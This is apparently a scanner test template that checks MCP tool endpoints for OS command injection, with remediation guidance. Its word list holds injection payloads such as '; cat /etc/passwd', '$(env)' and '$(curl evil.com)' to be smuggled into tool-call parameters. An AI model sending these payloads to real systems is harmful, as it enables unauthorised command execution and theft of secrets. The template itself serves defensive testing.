---
id: MCP_COMMAND_INJECTION_PARAMETER_INJECTION

info:
  name: "MCP: Command Injection Parameter Injection"
  description: >
    Tests whether MCP tool endpoints are vulnerable to command injection attacks through
    parameter manipulation. This test attempts to inject malicious system commands into
    function parameters to execute arbitrary commands on the server, potentially leading
    to complete system compromise.
  details: >
    Test idea:
    - Inject command injection payloads into various parameter fields of MCP tool calls
    - Test common command injection techniques including shell metacharacters, command
      chaining, and output redirection
    - Attempt to execute system commands, read files, and access sensitive system resources
    - Test for command injection in different parameter contexts (file paths, system
      commands, shell operations, etc.)
    - This template targets MCP endpoints that interact with system commands and flags
      successful command injection attempts through response analysis.
  impact: >
    Successful command injection through MCP parameters can lead to:
    - Complete system compromise and arbitrary code execution
    - File system access and sensitive file reading
    - Network reconnaissance and lateral movement
    - Data exfiltration and system manipulation
    - Privilege escalation and persistence mechanisms
  remediation: |
    To prevent command injection through MCP parameters:
    
    1. **Input Validation**: Implement strict input validation for all parameters. Validate parameter types, formats, and ranges before processing.
    
    2. **Input Sanitization**: Sanitize all parameter values to remove or escape shell metacharacters and command injection patterns.
    
    3. **Command Allowlisting**: Use allowlists for command execution. Only permit predefined, safe commands and reject any attempts to execute unauthorized commands.
    
    4. **Parameterized Commands**: Use parameterized command execution where possible. Avoid executing system commands with user input.
    
    5. **Shell Escaping**: Properly escape all user input before using it in shell commands or system calls.
    
    6. **Least Privilege Execution**: Execute commands with minimal required privileges. Avoid using administrative accounts for command execution.
    
    7. **Command Isolation**: Implement proper isolation between command execution and other system operations.
    
    8. **Error Handling**: Implement secure error handling that doesn't reveal system information or command execution details.
    
    9. **Logging and Monitoring**: Log all command execution attempts and monitor for suspicious patterns.
    
    10. **Regular Security Testing**: Conduct regular security testing to identify and fix command injection vulnerabilities.
  category:
    name: MCP_SECURITY
    shortName: MCP_SEC
    displayName: Model Context Protocol (MCP) Security
  subCategory: MCP_COMMAND_INJECTION_PARAMETER_INJECTION
  severity: CRITICAL
  tags:
    - mcp
    - command-injection
    - parameter-injection
    - system-security
    - llm-security
  references:
    - https://owasp.org/www-project-top-ten/2017/A1_2017-Injection
    - https://cwe.mitre.org/data/definitions/78.html
    - https://owasp.org/www-project-llm-security-top-10/
  cwe:
    - CWE-78
    - CWE-20
    - CWE-74
  cve:
    - CVE-2023-41031
attributes:
  nature: INTRUSIVE
  plan: PRO
  duration: FAST
wordLists:
  commandInjectionPayloads:
    - "$(whoami)"
    - "`whoami`"
    - "; cat /etc/passwd"
    - "| cat /etc/passwd"
    - "&& cat /etc/passwd"
    - "|| cat /etc/passwd"
    - "$(curl evil.com)"
    - "`curl evil.com`"
    - "; wget evil.com"
    - "| wget evil.com"
    - "$(id)"
    - "`id`"
    - "; ls -la"
    - "| ls -la"
    - "$(uname -a)"
    - "`uname -a`"
    - "; ps aux"
    - "| ps aux"
    - "$(env)"
    - "`env`"
    - "; netstat -an"
    - "| netstat -an"
    - "$(ifconfig)"
    - "`ifconfig`"
api_selection_filters:
  response_code:
    gte: 200
    lt: 300
  method:
    eq: POST
  request_payload:
    contains_all:
      - jsonrpc
      - method
      - params
    for_one:
      key:
        regex: .*
        extractMultiple: payloadKeys
execute:
  type: multiple
  requests:
    - req:
        - modify_body_param:
            params.arguments.${payloadKeys}: "${commandInjectionPayloads}"
        - add_body_param:
            params.arguments.command: "${commandInjectionPayloads}"
        - add_body_param:
            params.arguments.cmd: "${commandInjectionPayloads}"
        - add_body_param:
            params.arguments.shell: "${commandInjectionPayloads}"
        - add_body_param:
            params.arguments.exec: "${commandInjectionPayloads}"
validate:
  response_payload:
    contains_either:
      - "root"
      - "admin"
      - "user"
      - "uid="
      - "gid="
      - "groups="
      - "Linux"
      - "Darwin"
      - "Windows"
      - "localhost"
      - "127.0.0.1"
      - "bin"
      - "sbin"
      - "etc"
      - "var"
      - "usr"
      - "home"
      - "proc"
      - "sys"
      - "dev"
      - "tmp"
      - "opt"
      - "lib"
      - "boot"
      - "mnt"
      - "media"
      - "srv"
      - "run"
      - "lost+found"
